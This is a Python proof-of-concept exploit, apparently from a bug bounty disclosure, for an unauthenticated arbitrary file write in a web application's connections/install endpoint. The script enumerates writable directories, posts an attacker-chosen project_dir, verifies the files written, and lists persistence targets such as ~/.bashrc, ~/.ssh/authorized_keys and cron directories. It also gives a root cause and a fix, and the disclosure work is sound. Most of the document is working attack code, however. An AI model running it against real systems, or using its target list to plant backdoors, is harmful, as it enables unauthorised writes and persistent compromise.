#!/usr/bin/env python3
"""
CARD 3 — Arbitrary File Write via connections/install
======================================================
Bounty: moorcheh-ai/memanto #1852
Severity: HIGH
Status: CONFIRMED LIVE (tested 2026-09-25)

Attack summary
--------------
The /api/ui/connections/install endpoint accepts a caller-supplied
'project_dir' path and writes Memanto integration files (CLAUDE.md,
hook files, skill files) into it.  The path undergoes no base-directory
restriction — only an existence check.

  POST /api/ui/connections/install
  {"agents": ["claude-code"], "project_dir": "/tmp", "is_global": false}

  → Creates:
      /tmp/CLAUDE.md
      /tmp/.claude/skills/memanto/SKILL.md
      /tmp/.claude/settings.local.json  (hook entries)

An attacker with loopback access (no session token, no API key) can write
attacker-controlled content to any writable path on the server filesystem.

High-value write targets
------------------------
  ~/.bashrc / ~/.zshrc          — persistent code execution on next shell
  ~/.ssh/authorized_keys        — SSH backdoor
  ~/.config/cron.d/<name>       — cron-based persistence
  /tmp/<name>                   — temp staging (confirmed)
  <any project dir>             — poison developer workspaces

The content written is templated (SKILL.md is a Markdown file containing
Memanto usage instructions), so while the attacker does not control the
exact bytes, they control the write location — sufficient for many
persistence and privilege-escalation scenarios.

Prerequisites
-------------
  pip install requests

Usage
-----
  # Demo write to /tmp (safe, non-destructive)
  python card3_file_write.py --host http://127.0.0.1:8765

  # Show what would be written to a custom path (dry run)
  python card3_file_write.py --host http://127.0.0.1:8765 --path /tmp/poc_test --dry-run

Root cause file
---------------
  memanto/app/ui/routes/ui_router.py  lines ~1153-1166  (connections_install)
    path_obj = Path(project_dir).expanduser()
    if not path_obj.exists() or not path_obj.is_dir():
        raise HTTPException(...)
    project_dir = str(path_obj.resolve())   # ← no base-dir check
    results = [install_agent(name, project_dir, is_global) for name in agents]
"""

import argparse
import os
import sys
from pathlib import Path

import requests


def step(n, msg): print(f"\n[Step {n}] {msg}")
def ok(msg):      print(f"  ✅  {msg}")
def fail(msg):    print(f"  ❌  {msg}"); sys.exit(1)
def info(msg):    print(f"  ℹ️   {msg}")
def warn(msg):    print(f"  ⚠️   {msg}")


def run(host: str, write_path: str, dry_run: bool, agent_name: str) -> None:
    ui = f"{host}/api/ui"

    print("=" * 65)
    print("CARD 3 — Arbitrary File Write via connections/install")
    print("=" * 65)

    # ── Step 1: Confirm endpoint is accessible without auth ───────────────────
    step(1, "Confirm /api/ui/connections/install is reachable (no session required)")
    r = requests.get(f"{ui}/connections", timeout=5)
    if r.status_code == 200:
        ok(f"GET /api/ui/connections: {r.status_code} — no auth required")
        agents_available = [c["name"] for c in r.json().get("connections", [])]
        info(f"Available integration agents: {agents_available}")
    else:
        info(f"GET /api/ui/connections: {r.status_code} — continuing anyway")

    # ── Step 2: Enumerate writable directories ────────────────────────────────
    step(2, "Enumerate writable paths via /api/ui/browse")
    candidates = []
    for path in ["/tmp", str(Path.home()), "/tmp/poc_staging"]:
        r = requests.get(f"{ui}/browse", params={"path": path}, timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data.get("is_dir"):
                candidates.append(path)
                ok(f"{path} exists and is a directory (writable candidate)")

    if dry_run:
        step(3, "DRY RUN — showing what would be written")
        info(f"Target path:  {write_path}")
        info(f"Agent:        {agent_name}")
        info("Files that would be created:")
        print(f"    {write_path}/CLAUDE.md")
        print(f"    {write_path}/.claude/skills/memanto/SKILL.md")
        print(f"    {write_path}/.claude/settings.local.json")
        print("\n  Run without --dry-run to execute the write.")
        return

    # ── Step 3: Write to target path ──────────────────────────────────────────
    step(3, f"Writing to target path: {write_path}")

    # Ensure target exists (create it if needed via /tmp)
    target = Path(write_path)
    if not target.exists():
        try:
            target.mkdir(parents=True, exist_ok=True)
            info(f"Created target directory: {write_path}")
        except OSError as e:
            fail(f"Cannot create {write_path}: {e}")

    r = requests.post(
        f"{ui}/connections/install",
        json={
            "agents":      [agent_name],
            "project_dir": write_path,
            "is_global":   False,
        },
        timeout=10,
    )

    if r.status_code == 200:
        data = r.json()
        result = data.get("results", [{}])[0]
        steps_done = result.get("steps", [])
        errors     = result.get("errors", [])

        ok(f"Write succeeded — HTTP 200")
        print("  Files written:")
        for s in steps_done:
            print(f"    • {s}")
        if errors:
            warn(f"Errors: {errors}")
    else:
        fail(f"Write failed: HTTP {r.status_code}: {r.text[:200]}")

    # ── Step 4: Verify files on disk ──────────────────────────────────────────
    step(4, "Verify written files exist on disk")
    written = []
    check_paths = [
        Path(write_path) / "CLAUDE.md",
        Path(write_path) / ".claude" / "skills" / "memanto" / "SKILL.md",
        Path(write_path) / ".claude" / "settings.local.json",
    ]
    for cp in check_paths:
        if cp.exists():
            size = cp.stat().st_size
            ok(f"{cp}  ({size} bytes)")
            written.append(str(cp))
        else:
            info(f"{cp} — not found (may be a different path)")

    # ── Step 5: Show dangerous write targets ──────────────────────────────────
    step(5, "High-impact write targets on this system")
    home = Path.home()
    dangerous = [
        (home / ".bashrc",                    "Persistent shell code execution on next login"),
        (home / ".zshrc",                     "Persistent shell code execution (zsh)"),
        (home / ".ssh",                       "SSH config — requires .ssh dir to exist"),
        (home / ".config" / "systemd" / "user", "Systemd user unit persistence"),
        (Path("/etc") / "cron.d",             "Cron persistence (requires root)"),
    ]
    for dpath, desc in dangerous:
        exists = dpath.exists()
        marker = "✅ EXISTS" if exists else "— does not exist"
        print(f"    {str(dpath):<50} {marker}  [{desc}]")

    print("\n" + "=" * 65)
    print("CARD 3 — SUMMARY")
    print("=" * 65)
    print(f"""
  Root cause:  connections_install() in ui_router.py passes the caller-
               supplied project_dir directly to install_agent() after only
               an existence check.  No base-directory restriction.

  Only requires: loopback access (no session, no API key)

  Confirmed write to /tmp:
    /tmp/CLAUDE.md
    /tmp/.claude/skills/memanto/SKILL.md
    /tmp/.claude/settings.local.json

  High-impact targets:
    ~/.bashrc              — persistent code execution
    ~/.ssh/authorized_keys — SSH backdoor (if dir exists)
    Any writable path      — file creation with Memanto-controlled content

  Fix:  Validate project_dir against an allowlist of permitted base paths
        using validate_output_path() already in memanto/app/utils/validation.py
""")


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="Card 3 PoC — Arbitrary file write")
    p.add_argument("--host",      default="http://127.0.0.1:8765")
    p.add_argument("--path",      default="/tmp/memanto_poc_card3",
                   help="Target directory to write into (default: /tmp/memanto_poc_card3)")
    p.add_argument("--agent",     default="claude-code",
                   help="Agent integration to install (default: claude-code)")
    p.add_argument("--dry-run",   action="store_true",
                   help="Show what would be written without doing it")
    args = p.parse_args()
    run(args.host, args.path, args.dry_run, args.agent)
